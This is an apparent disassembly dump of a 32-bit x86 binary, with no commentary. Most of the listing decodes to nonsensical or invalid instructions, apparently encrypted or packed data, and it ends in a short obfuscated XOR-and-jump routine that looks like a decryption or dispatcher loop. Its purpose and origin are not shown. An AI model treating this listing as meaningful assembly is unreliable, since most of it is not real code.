  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	jge    0x403018
  403083:	lea    edx,[ebx-0x55]
  403086:	and    DWORD PTR [eax-0x13394653],edi
  40308c:	aam    0xc7
  40308e:	push   0xc8413b0
  403093:	and    ch,al
  403095:	xchg   edx,eax
  403096:	xor    DWORD PTR [ebx],esi
  403098:	fstp   DWORD PTR [edi+0x74]
  40309b:	sbb    eax,ebp
  40309d:	mov    WORD PTR [ebx-0x15],fs
  4030a0:	cwde   
  4030a1:	je     0x4030fe
  4030a3:	mov    bl,0xb
  4030a5:	das    
  4030a6:	sbb    eax,0xbce6d86a
  4030ab:	push   ecx
  4030ac:	imul   DWORD PTR [ecx-0x2665d10e]
  4030b2:	adc    eax,0x8c2a0781
  4030b7:	sbb    eax,0xfb5d1198
  4030bc:	es (bad) 
  4030bf:	push   ecx
  4030c0:	iret   
  4030c1:	iret   
  4030c2:	xchg   DWORD PTR [esi+0x18cafebd],ebx
  4030c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030c9:	sbb    DWORD PTR [edx-0x5a],0x43f756c0
  4030d0:	mov    BYTE PTR [ebp+0x68],bl
  4030d3:	sbb    ebp,DWORD PTR [eax]
  4030d5:	cmp    al,0xc
  4030d7:	sub    bh,BYTE PTR [ebx+ecx*2-0x63]
  4030db:	mov    ecx,0x8e2811a9
  4030e0:	sar    esi,1
  4030e2:	adc    al,0x61
  4030e4:	mov    edx,ebx
  4030e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030e7:	mov    edi,0xfc968760
  4030ec:	push   edi
  4030ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030ee:	aas    
  4030ef:	mov    dl,0xe7
  4030f1:	jmp    0x83d3:0x6da2d9a5
  4030f8:	cli    
  4030f9:	dec    edx
  4030fa:	lahf   
  4030fb:	xchg   edi,eax
  4030fc:	cmp    DWORD PTR [eiz*1+0x7fb816ce],esi
  403103:	mov    ecx,0xd3567fff
  403108:	daa    
  403109:	and    ch,ah
  40310b:	rol    dh,1
  40310d:	in     al,dx
  40310e:	imul   ecx,esi,0x47824c51
  403114:	mov    eax,ds:0x402ee124
  403119:	xor    eax,DWORD PTR [ebx+0x9610218]
  40311f:	xchg   BYTE PTR [esi+0x184a35b3],ah
  403125:	ins    DWORD PTR es:[edi],dx
  403126:	jno    0x403102
  403128:	push   es
  403129:	out    0x34,eax
  40312b:	popf   
  40312c:	(bad)  
  40312e:	add    al,0x75
  403130:	xchg   edx,eax
  403131:	adc    eax,0x339fcc4b
  403136:	out    0xac,eax
  403138:	ins    DWORD PTR es:[edi],dx
  403139:	jae    0x403158
  40313b:	stc    
  40313c:	ins    DWORD PTR es:[edi],dx
  40313d:	shl    DWORD PTR [edi-0xa62837e],0xc1
  403144:	mov    edi,0xdd45be0b
  403149:	lock leave 
  40314b:	fcom   DWORD PTR [ecx+0x4c]
  40314e:	xor    ah,BYTE PTR [ebp-0x4e57b268]
  403154:	mov    dl,0x1d
  403156:	dec    ecx
  403157:	cmc    
  403158:	into   
  403159:	(bad)  
  40315b:	mov    dl,0xd8
  40315d:	jbe    0x40319c
  40315f:	jbe    0x403149
  403161:	inc    eax
  403162:	hlt    
  403163:	stos   BYTE PTR es:[edi],al
  403164:	in     eax,0x16
  403166:	fcom   DWORD PTR [ebx+0x32]
  403169:	repz mov al,ds:0xa1404c7c
  40316f:	mov    esp,0xb05d7740
  403174:	(bad)  
  403176:	ins    DWORD PTR es:[edi],dx
  403177:	rcr    DWORD PTR gs:[edx-0x3efdacc2],0xe9
  40317f:	cli    
  403180:	rcl    BYTE PTR [esi],0xba
  403183:	sti    
  403184:	inc    edi
  403185:	rol    bl,1
  403187:	sub    esp,DWORD PTR [eax]
  403189:	xchg   ebp,eax
  40318a:	fcom   QWORD PTR [edi+0x4f]
  40318d:	(bad)  
  40318e:	cld    
  40318f:	cmp    eax,0x965d568a
  403194:	cmp    BYTE PTR [ecx+0x61],dh
  403197:	aas    
  403198:	shl    esp,1
  40319a:	xor    DWORD PTR [edi+0x18640f6c],edi
  4031a0:	dec    eax
  4031a1:	mov    bl,BYTE PTR [eax-0x3b45b80c]
  4031a7:	xlat   BYTE PTR ds:[ebx]
  4031a8:	adc    DWORD PTR [edx+eiz*1],0xde297bd
  4031af:	cmp    DWORD PTR [edi+edi*8-0x70],ecx
  4031b3:	or     al,0x96
  4031b5:	mov    ds:0x891c8b61,al
  4031ba:	sti    
  4031bb:	in     eax,dx
  4031bc:	mov    dl,0x47
  4031be:	sbb    BYTE PTR [esi+0x6b],0x26
  4031c2:	xor    DWORD PTR [edx],edx
  4031c4:	iret   
  4031c5:	outs   dx,DWORD PTR ds:[esi]
  4031c6:	xor    edx,DWORD PTR [edx+edi*2-0x30]
  4031ca:	sbb    BYTE PTR [ebp-0x1b],al
  4031cd:	nop
  4031ce:	(bad)  
  4031cf:	xor    BYTE PTR [edx],0x1c
  4031d2:	push   edx
  4031d3:	cmc    
  4031d4:	into   
  4031d5:	sub    eax,0x895d3ecc
  4031da:	(bad)  [edx]
  4031dc:	xor    dh,BYTE PTR [ebp-0x3a]
  4031df:	or     eax,0xfc2bb24d
  4031e4:	lods   eax,DWORD PTR ds:[esi]
  4031e5:	ret    0x61ec
  4031e8:	xchg   edi,eax
  4031e9:	cli    
  4031ea:	mov    ecx,0x9c4731db
  4031ef:	leave  
  4031f0:	in     al,0xf5
  4031f2:	mov    eax,ds:0x67f623a5
  4031f7:	cld    
  4031f8:	bound  esp,QWORD PTR [edx-0x5d]
  4031fb:	adc    DWORD PTR [edx+eiz*4+0x44],eax
  4031ff:	xchg   esp,eax
  403200:	stc    
  403201:	(bad)  
  403202:	mov    ds:0x9f752e9b,al
  403207:	mov    al,ds:0xab44dbf8
  40320c:	stos   BYTE PTR es:[edi],al
  40320d:	xor    BYTE PTR [ebp+0x53893ecc],dl
  403213:	mov    ds:0x900fe160,al
  403218:	jo     0x4031f6
  40321a:	retf   0xbd79
  40321d:	dec    esp
  40321e:	xchg   edi,eax
  40321f:	or     BYTE PTR [edx+0x786861e3],bh
  403225:	cmc    
  403226:	in     eax,dx
  403227:	lock cld 
  403229:	push   esp
  40322a:	cmp    BYTE PTR [ebp-0x1132fb5e],0x31
  403231:	cli    
  403232:	cmp    eax,0x2f4850b3
  403237:	ja     0x40321e
  403239:	shl    dh,cl
  40323b:	add    BYTE PTR [ecx],bl
  40323d:	mov    bl,0x9c
  40323f:	fs or  eax,0x37d106b8
  403245:	sbb    ah,dl
  403247:	mov    fs,esp
  403249:	sbb    eax,DWORD PTR [ecx-0x78]
  40324c:	into   
  40324d:	test   al,0xe0
  40324f:	and    ecx,0xdaa82ba
  403255:	mov    ebx,0xed02a0ad
  40325a:	div    bl
  40325c:	pusha  
  40325d:	pop    eax
  40325e:	xchg   esp,eax
  40325f:	popf   
  403260:	cli    
  403261:	xchg   ebx,eax
  403262:	pop    es
  403263:	dec    edx
  403264:	jge    0x403255
  403266:	js     0x403243
  403268:	xor    DWORD PTR [ecx],edx
  40326a:	nop
  40326b:	fbstp  TBYTE PTR [esp+edi*1-0xb]
  40326f:	jns    0x4031f7
  403271:	xor    DWORD PTR [esi-0x3422a689],0x77
  403278:	cld    
  403279:	test   al,0xed
  40327b:	out    dx,eax
  40327c:	xor    eax,0xa7e68257
  403281:	cmp    DWORD PTR [esi-0x6],edx
  403284:	jecxz  0x4032f3
  403286:	xor    eax,0xf3ced2c5
  40328b:	mov    al,0x4c
  40328d:	or     BYTE PTR [eax],bl
  40328f:	pop    esi
  403290:	scas   eax,DWORD PTR es:[edi]
  403291:	loop   0x40328f
  403293:	scas   eax,DWORD PTR es:[edi]
  403294:	outs   dx,DWORD PTR ds:[esi]
  403295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403296:	mov    ebp,0xa62e8364
  40329b:	push   ebx
  40329c:	mov    bh,0x64
  40329e:	push   DWORD PTR [esi-0x11]
  4032a1:	test   al,0x7a
  4032a3:	popf   
  4032a4:	retf   
  4032a5:	outs   dx,DWORD PTR ds:[esi]
  4032a6:	loopne 0x4032e9
  4032a8:	(bad)  
  4032a9:	mov    bh,0xf8
  4032ab:	sbb    DWORD PTR [ecx],edx
  4032ad:	pop    ebp
  4032ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032af:	popa   
  4032b0:	push   es
  4032b1:	call   0x46c97c1b
  4032b6:	shr    BYTE PTR ds:0x4ee911b8,cl
  4032bc:	cmp    edx,ebx
  4032be:	pop    eax
  4032bf:	mov    ebp,0x62ee9d18
  4032c4:	push   ds
  4032c5:	test   BYTE PTR [ebx+esi*2],cl
  4032c8:	into   
  4032c9:	push   ss
  4032ca:	jo     0x4032ab
  4032cc:	add    ah,BYTE PTR [esi]
  4032ce:	out    dx,eax
  4032cf:	stc    
  4032d0:	outs   dx,BYTE PTR ds:[esi]
  4032d1:	dec    ebp
  4032d2:	cmp    DWORD PTR [eax],0xd47bd4ff
  4032d8:	pusha  
  4032d9:	xchg   esp,eax
  4032da:	ins    DWORD PTR es:[edi],dx
  4032db:	sbb    BYTE PTR [eax-0x768f10b5],bh
  4032e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032e2:	push   0x310172f3
  4032e7:	xchg   edx,eax
  4032e8:	mov    esi,0x9f2038bf
  4032ed:	int3   
  4032ee:	or     BYTE PTR [edi+0x4ad2a449],bl
  4032f4:	scas   eax,DWORD PTR es:[edi]
  4032f5:	push   esp
  4032f6:	xor    eax,0xd8a4ec3
  4032fb:	mov    edi,0xf1e3a8ee
  403300:	dec    ecx
  403301:	frstor [ebx-0x21]
  403304:	test   bh,bl
  403306:	cmp    BYTE PTR [ebp+eiz*8+0x2ade2e89],dl
  40330d:	std    
  40330e:	pop    edi
  40330f:	fist   WORD PTR [ebx+ebx*2]
  403312:	add    edx,DWORD PTR [ebp-0x25]
  403315:	mov    edx,ds
  403317:	jp     0x40335d
  403319:	pop    edi
  40331a:	push   eax
  40331b:	pop    ss
  40331c:	dec    eax
  40331d:	mov    esi,DWORD PTR [edx]
  40331f:	inc    ebx
  403320:	fnstenv [ebx]
  403322:	out    0xc9,eax
  403324:	aaa    
  403325:	xlat   BYTE PTR gs:[ebx]
  403327:	inc    esi
  403328:	mov    esp,0x9d2e89fc
  40332d:	xchg   edi,eax
  40332e:	pop    edi
  40332f:	pop    eax
  403330:	shl    BYTE PTR [ebx+0x33a0b7fe],cl
  403336:	or     ah,BYTE PTR [eax+0x5a]
  403339:	daa    
  40333a:	sbb    DWORD PTR [ebx-0x5f02d850],esp
  403340:	(bad)  [esi-0x8a32323]
  403346:	dec    esi
  403347:	mov    ebp,0x24772049
  40334c:	inc    eax
  40334d:	xchg   esi,eax
  40334e:	adc    BYTE PTR [ebx],bh
  403350:	int    0x30
  403352:	add    eax,DWORD PTR [edx]
  403354:	jmp    0x403336
  403356:	push   ds
  403357:	or     esp,eax
  403359:	xchg   esp,eax
  40335a:	sbb    al,0xc3
  40335c:	lock daa 
  40335e:	push   ecx
  40335f:	xchg   BYTE PTR [edx],al
  403361:	scas   eax,DWORD PTR es:[edi]
  403362:	inc    esp
  403363:	jl     0x403317
  403365:	test   BYTE PTR [edi+0x24],0x72
  403369:	out    0x65,eax
  40336b:	clc    
  40336c:	sub    edi,ebp
  40336e:	inc    edx
  40336f:	cmp    eax,0x5e2e62a2
  403374:	dec    ebx
  403375:	cmp    DWORD PTR [eiz*8+0x2eea2fd7],ebx
  40337c:	fdivr  st(2),st
  40337e:	sbb    al,0xb9
  403380:	adc    DWORD PTR [eax],ebp
  403382:	xchg   ebp,eax
  403383:	cmp    eax,0x3f6cc358
  403388:	in     al,dx
  403389:	mov    dh,0xce
  40338b:	xor    edx,edx
  40338d:	adc    eax,0x39f7f173
  403392:	xchg   esi,eax
  403393:	les    edx,FWORD PTR [esi-0x723c6c75]
  403399:	sub    eax,0x97ed1839
  40339e:	(bad)  
  4033a1:	stos   BYTE PTR es:[edi],al
  4033a2:	xor    eax,0x2d89fd47
  4033a7:	push   es
  4033a8:	arpl   WORD PTR [eax+eiz*8],bx
  4033ab:	jmp    0x56f2:0xed6b06c8
  4033b2:	inc    edi
  4033b3:	imul   ebx,DWORD PTR [eax-0x74bc03b4],0xffffffbd
  4033ba:	clc    
  4033bb:	xchg   esp,eax
  4033bc:	clc    
  4033bd:	xchg   edi,eax
  4033be:	inc    ebx
  4033bf:	(bad)  [ebp-0x7c9ff59d]
  4033c5:	dec    eax
  4033c6:	xchg   esp,ecx
  4033c8:	ins    BYTE PTR es:[edi],dx
  4033c9:	xchg   edi,eax
  4033ca:	test   al,0x82
  4033cc:	jmp    0x3336:0xff4b853f
  4033d3:	jge    0x4033f4
  4033d5:	test   ebx,0x517cf49
  4033db:	jge    0x4033b5
  4033dd:	and    eax,0x38f502aa
  4033e2:	inc    edx
  4033e3:	js     0x403389
  4033e5:	cmp    DWORD PTR ds:0x328eee38,ebp
  4033eb:	dec    ecx
  4033ec:	mov    WORD PTR [edi+0x9],fs
  4033ef:	hlt    
  4033f0:	jae    0x40343a
  4033f2:	mov    al,ds:0xb0dbc40e
  4033f7:	xchg   esp,eax
  4033f8:	sub    DWORD PTR [ecx+0x248430ae],ebx
  4033fe:	les    ecx,FWORD PTR [ebp-0x47]
  403401:	mov    edx,DWORD PTR [edx]
  403403:	mov    bl,0x1f
  403405:	sbb    bl,BYTE PTR [edi]
  403407:	loopne 0x40345c
  403409:	pop    ebx
  40340a:	pop    es
  40340b:	outs   dx,DWORD PTR ds:[esi]
  40340c:	das    
  40340d:	xchg   DWORD PTR [ebx+0x3e69bcc6],esi
  403413:	xor    esp,DWORD PTR [edx-0x75]
  403416:	jge    0x403420
  403418:	mov    edi,DWORD PTR [edi]
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	adc    eax,0x2277cec9
  403438:	push   ds
  403439:	jle    0x4034b9
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	xor    BYTE PTR [ebx-0x80],bh
  403442:	outs   dx,BYTE PTR ds:[esi]
  403443:	sbb    al,0x30
  403445:	int    0x6b
  403447:	cmp    DWORD PTR [ecx],edi
  403449:	test   BYTE PTR [ecx-0x3afb9d1],0x65
  403450:	sub    al,0x1a
  403452:	mov    BYTE PTR [ebx+0x1795d8cb],bl
  403458:	inc    ecx
  403459:	inc    edx
  40345a:	xor    BYTE PTR [edx],ch
  40345c:	inc    edi
  40345d:	jb     0x4034ac
  40345f:	dec    ecx
  403460:	mov    al,ds:0xbba1458a
  403465:	addr16 jp 0x40340b
  403468:	je     0x4034e6
  40346a:	popf   
  40346b:	dec    ebp
  40346c:	pop    ebp
  40346d:	jnp    0x40343e
  40346f:	sub    BYTE PTR [ebp-0x1b],al
  403472:	xchg   ebx,eax
  403473:	rcl    DWORD PTR [ebx+0x22],0x56
  403477:	pop    es
  403478:	sbb    BYTE PTR [edi+0x74],dh
  40347b:	fist   WORD PTR [ebp+0x46bcc2e3]
  403481:	sub    BYTE PTR [ebp+0x3a],0xd5
  403485:	push   edi
  403486:	jo     0x403432
  403488:	add    eax,0x6f7474dc
  40348d:	sub    BYTE PTR [eax],ah
  40348f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403490:	mov    DWORD PTR [edx+0x59],edx
  403493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403494:	cli    
  403495:	scas   eax,DWORD PTR es:[edi]
  403496:	dec    ebp
  403497:	inc    DWORD PTR [esi]
  403499:	pushf  
  40349a:	outs   dx,BYTE PTR ds:[esi]
  40349b:	add    BYTE PTR [ecx-0x23],al
  40349e:	(bad)  
  40349f:	repnz push esi
  4034a1:	pop    ds
  4034a2:	cli    
  4034a3:	jo     0x403426
  4034a5:	add    DWORD PTR [esi+ebx*1],esp
  4034a8:	jne    0x4034a9
  4034aa:	jge    0x403529
  4034ac:	dec    ebx
  4034ad:	cmc    
  4034ae:	popf   
  4034af:	scas   eax,DWORD PTR es:[edi]
  4034b0:	sub    al,0xa7
  4034b2:	xchg   edx,eax
  4034b3:	repnz mov edx,0x2ed0f42a
  4034b9:	mov    ?,WORD PTR [esi-0x7518db97]
  4034bf:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034c1:	sbb    BYTE PTR [ebx+edx*8-0xc],0xf0
  4034c6:	inc    eax
  4034c7:	sar    ch,0x18
  4034ca:	add    ebp,edx
  4034cc:	cmc    
  4034cd:	in     al,dx
  4034ce:	rcr    esi,cl
  4034d0:	mov    al,0xc3
  4034d2:	inc    ebp
  4034d3:	int    0x99
  4034d5:	ret    
  4034d6:	sbb    eax,0x219d4be8
  4034db:	sub    bl,bl
  4034dd:	push   cs
  4034de:	adc    dl,BYTE PTR [ecx]
  4034e0:	mov    ch,0xb8
  4034e2:	mov    esi,0x82aafb29
  4034e7:	mov    ds:0xa2465663,al
  4034ec:	xor    cl,BYTE PTR [ebx-0x20]
  4034ef:	mov    gs,WORD PTR [edi]
  4034f1:	pop    es
  4034f2:	mov    ds:0xc2d231ab,al
  4034f7:	aad    0xd
  4034f9:	push   ebx
  4034fa:	test   eax,0x672643a
  4034ff:	mov    bh,0x29
  403501:	dec    ecx
  403502:	mov    dh,0x48
  403504:	cmc    
  403505:	push   edx
  403506:	inc    ebp
  403507:	mov    esi,DWORD PTR [edx+0x4ba33a34]
  40350d:	pop    esp
  40350e:	outs   dx,BYTE PTR ds:[esi]
  40350f:	jecxz  0x4034df
  403511:	push   ebp
  403512:	xor    DWORD PTR [eax],ebp
  403514:	cmp    DWORD PTR [ebx+0x79c00f97],0xffffffb9
  40351b:	inc    ebx
  40351c:	push   0x6d
  40351e:	std    
  40351f:	pop    ecx
  403520:	cmp    ebp,DWORD PTR [eax+0x345c1419]
  403526:	test   DWORD PTR [eax],edi
  403528:	shl    BYTE PTR [ebx+ecx*8-0x76],cl
  40352c:	mov    BYTE PTR [ebx+0x57],ah
  40352f:	fistp  QWORD PTR [ecx]
  403531:	push   esi
  403532:	jnp    0x40351f
  403534:	ret    
  403535:	shl    DWORD PTR [ebx+0x6e0bd92d],1
  40353b:	inc    ebx
  40353c:	inc    ebp
  40353d:	add    DWORD PTR [edi+0xd],ebx
  403540:	xchg   DWORD PTR [ebp+0x1e0c6c54],esp
  403546:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  403548:	icebp  
  403549:	mov    eax,ds:0xa5a97dd4
  40354e:	data16 mov ch,0x14
  403551:	mov    bh,0xf8
  403553:	push   es
  403554:	aaa    
  403555:	pop    ebx
  403556:	jb     0x4034db
  403558:	push   ecx
  403559:	add    al,dh
  40355b:	mov    esp,0x1b99ba24
  403560:	or     eax,0x28842c4
  403565:	std    
  403566:	std    
  403567:	ret    0x157
  40356a:	mov    dh,BYTE PTR [esi+0x22]
  40356d:	mov    al,ds:0xbfdbdab7
  403572:	adc    eax,0xa48d7ca7
  403577:	mov    ds:0xf2945554,eax
  40357c:	xor    al,0x7e
  40357e:	jae    0x4035f2
  403580:	mov    ds:0x7bb15170,eax
  403585:	stc    
  403586:	sub    DWORD PTR [edx-0x10],0xffffffd0
  40358a:	mov    edx,0xb43a201a
  40358f:	dec    esi
  403590:	jno    0x40351e
  403592:	mov    ebx,0xbccc84bd
  403597:	xchg   edx,eax
  403598:	push   eax
  403599:	adc    al,0xcd
  40359b:	or     al,BYTE PTR [ecx-0x36]
  40359e:	mov    esp,0x24af79a
  4035a3:	not    dh
  4035a5:	rcr    DWORD PTR [ebp+0x58],1
  4035a8:	dec    bx
  4035aa:	jne    0x403612
  4035ac:	or     eax,0x4184a668
  4035b1:	or     BYTE PTR [edi+0x48],dl
  4035b4:	sbb    bl,BYTE PTR [eax-0x13b02add]
  4035ba:	sub    DWORD PTR [eax+0x7a],edi
  4035bd:	loope  0x403588
  4035bf:	retf   
  4035c0:	mov    DWORD PTR [esp+ebp*4-0x79c40b91],edx
  4035c7:	scas   al,BYTE PTR es:[edi]
  4035c8:	call   0x4fcf2b24
  4035cd:	mov    eax,ds:0x51b39b4e
  4035d2:	scas   al,BYTE PTR es:[edi]
  4035d3:	pop    ds
  4035d4:	into   
  4035d5:	cdq    
  4035d6:	dec    ebx
  4035d7:	push   ecx
  4035d8:	jecxz  0x4035cf
  4035da:	cwde   
  4035db:	adc    DWORD PTR [eax+edx*1-0x57],edi
  4035df:	jecxz  0x4035c7
  4035e1:	xchg   DWORD PTR [ebx],ecx
  4035e3:	arpl   bp,dx
  4035e5:	pusha  
  4035e6:	ins    BYTE PTR es:[edi],dx
  4035e7:	fwait
  4035e8:	add    bh,BYTE PTR [ebp-0x36]
  4035eb:	loope  0x4035cf
  4035ed:	or     eax,0x5a2df69e
  4035f2:	rcr    BYTE PTR [eax+0x71],1
  4035f5:	bound  ebx,QWORD PTR [ebp+0x59c2e1bb]
  4035fb:	pop    edx
  4035fc:	stos   DWORD PTR es:[edi],eax
  4035fd:	pusha  
  4035fe:	xchg   edx,eax
  4035ff:	mov    DWORD PTR [edx],ecx
  403601:	inc    edx
  403602:	pushf  
  403603:	repnz fstp st(1)
  403606:	rcr    BYTE PTR [edx],cl
  403608:	sub    al,0x30
  40360a:	xor    DWORD PTR [ebp+0x39],ebx
  40360d:	scas   eax,DWORD PTR es:[edi]
  40360e:	push   cs
  40360f:	and    eax,esi
  403611:	sbb    eax,0x11166ef
  403616:	sub    ebp,esp
  403618:	aad    0x34
  40361a:	lea    edi,[edi+0x19586a92]
  403620:	mov    ah,al
  403622:	popf   
  403623:	mov    esi,0x130e106c
  403628:	cmp    dl,dl
  40362a:	sbb    eax,0xa6f19f0
  40362f:	int    0x1f
  403631:	es mov esp,0xf2028c76
  403637:	in     eax,0xc7
  403639:	or     dl,BYTE PTR [edx-0x5f]
  40363c:	scas   eax,DWORD PTR es:[edi]
  40363d:	retf   0xa6fb
  403640:	fs mov cl,0xfb
  403643:	addr16 data16 (bad) 
  403646:	js     0x403672
  403648:	inc    ecx
  403649:	repnz dec edi
  40364b:	in     eax,dx
  40364c:	pop    ss
  40364d:	jno    0x40364a
  40364f:	mov    WORD PTR ds:0xaebe417a,gs
  403655:	div    BYTE PTR [edi]
  403657:	push   eax
  403658:	pop    edx
  403659:	inc    edx
  40365a:	jecxz  0x4036a7
  40365c:	adc    edi,DWORD PTR [ecx]
  40365e:	repnz daa 
  403660:	cmp    DWORD PTR [esi+eiz*1-0x53],edi
  403664:	cmp    ebp,DWORD PTR [edx+0x1e]
  403667:	retf   0x3c72
  40366a:	push   edx
  40366b:	jnp    0x4036b2
  40366d:	call   0x784f92d7
  403672:	pop    esp
  403673:	ret    0x75df
  403676:	inc    eax
  403677:	mov    cl,0x12
  403679:	pushf  
  40367a:	xchg   ebx,eax
  40367b:	or     eax,0x65077cf3
  403680:	(bad)  
  403681:	jnp    0x4036b4
  403683:	js     0x403701
  403685:	stc    
  403686:	dec    eax
  403687:	xor    al,BYTE PTR [ebx]
  403689:	loopne 0x403642
  40368b:	add    ch,BYTE PTR [ebx]
  40368d:	sbb    BYTE PTR [edi+0x49933350],al
  403693:	adc    al,0x29
  403695:	inc    ebp
  403696:	mul    DWORD PTR [ebx+0x48]
  403699:	outs   dx,BYTE PTR ds:[esi]
  40369a:	pushf  
  40369b:	ss loope 0x40365a
  40369e:	and    al,0xb5
  4036a0:	xchg   BYTE PTR [edx+0xc3efd86],ch
  4036a6:	mov    ch,0xd9
  4036a8:	adc    al,0x10
  4036aa:	call   0xe485f71
  4036af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036b0:	mov    esp,gs
  4036b2:	rcl    DWORD PTR [ecx+0x62],0x7e
  4036b6:	inc    ebx
  4036b7:	add    ecx,eax
  4036b9:	cmp    ecx,DWORD PTR [edx]
  4036bb:	std    
  4036bc:	retf   0x8b24
  4036bf:	push   es
  4036c0:	pop    esi
  4036c1:	and    ecx,esp
  4036c3:	pop    es
  4036c4:	or     dh,bh
  4036c6:	jmp    0x40371e
  4036c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036c9:	mov    BYTE PTR [ebx-0x7813c4f],cl
  4036cf:	pop    eax
  4036d0:	mov    ch,0x82
  4036d2:	mov    WORD PTR [edx],?
  4036d4:	ret    
  4036d5:	mov    bh,0xd7
  4036d7:	fs cs and al,0x5e
  4036db:	icebp  
  4036dc:	cmp    al,0x8a
  4036de:	jg     0x40373c
  4036e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036e1:	or     dl,BYTE PTR [edi+ebx*8-0x2c258ed]
  4036e8:	or     al,0x78
  4036ea:	inc    edx
  4036eb:	sbb    BYTE PTR [ecx+0x4e],dh
  4036ee:	loop   0x40368d
  4036f0:	sahf   
  4036f1:	loopne 0x403739
  4036f3:	dec    edx
  4036f4:	or     dh,BYTE PTR [ecx-0x74]
  4036f7:	push   edi
  4036f8:	into   
  4036f9:	mov    ebp,0x3a59d4a5
  4036fe:	xor    al,0xab
  403700:	gs cld 
  403702:	mov    eax,0xfc294889
  403707:	pop    ebp
  403708:	clc    
  403709:	mov    eax,ds:0xe6c8517d
  40370e:	xchg   BYTE PTR [edi+0x78d803b3],bl
  403714:	(bad)  
  403715:	mov    ecx,0x95994460
  40371a:	mov    edi,0x40f980fd
  40371f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403720:	pop    ds
  403721:	mov    cl,0xa0
  403723:	imul   ebp,DWORD PTR [ebp-0x4c90529b],0x6b
  40372a:	jle    0x403720
  40372c:	ins    BYTE PTR es:[edi],dx
  40372d:	mov    ah,0x4
  40372f:	inc    ebx
  403730:	mov    ch,0x5c
  403732:	mov    ebp,0x93f49477
  403737:	xchg   BYTE PTR [esi],cl
  403739:	jecxz  0x40377a
  40373b:	jne    0x40372b
  40373d:	(bad)  
  40373e:	jb     0x40373b
  403740:	push   0x56
  403742:	(bad)  
  403743:	clc    
  403744:	dec    esp
  403745:	call   0x5aca3bc1
  40374a:	pop    eax
  40374b:	test   BYTE PTR [ebx-0x3da524e6],bl
  403751:	fwait
  403752:	icebp  
  403753:	in     eax,0x97
  403755:	std    
  403756:	adc    bl,cl
  403758:	(bad)  
  403759:	mov    ebx,0x679ab296
  40375e:	xchg   ecx,eax
  40375f:	je     0x4037ae
  403761:	xor    ch,al
  403763:	mov    al,ds:0x205397c8
  403768:	cmp    eax,0x37c96869
  40376d:	jp     0x403725
  40376f:	push   esp
  403770:	cld    
  403771:	push   es
  403772:	test   eax,0x9a132956
  403777:	repz mov ds:0xc1bd3ae7,al
  40377d:	sub    eax,0xcd11a644
  403782:	std    
  403783:	adc    ecx,DWORD PTR [esi]
  403785:	ret    0x1393
  403788:	in     al,dx
  403789:	dec    ebp
  40378a:	test   al,0x35
  40378c:	clc    
  40378d:	(bad)  
  40378e:	ss cmp eax,0xdbf5337c
  403794:	dec    ecx
  403795:	out    0xa7,eax
  403797:	es fs add ebx,eax
  40379b:	pop    edx
  40379c:	sbb    eax,DWORD PTR [ebx-0x1]
  40379f:	sub    ecx,0x77
  4037a2:	sahf   
  4037a3:	fadd   QWORD PTR [ebx+0xe]
  4037a6:	xor    DWORD PTR [edi+eiz*4],ebp
  4037a9:	jb     0x4037f4
  4037ab:	mov    al,0xef
  4037ad:	add    BYTE PTR [ebx],bh
  4037af:	mov    eax,0x3a32b681
  4037b4:	shl    BYTE PTR [ecx-0x72a71506],1
  4037ba:	xchg   bh,bh
  4037bc:	adc    bh,dl
  4037be:	mov    ecx,0x959e1656
  4037c3:	cmp    BYTE PTR [ebp+0x79],dl
  4037c6:	test   eax,0xc21b96c2
  4037cb:	enter  0x3782,0x51
  4037cf:	xor    BYTE PTR [ecx],dl
  4037d1:	call   0x3b46f214
  4037d6:	add    BYTE PTR [eax],al
  4037d8:	add    ax,dx
  4037db:	cmp    ax,WORD PTR [edi]
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
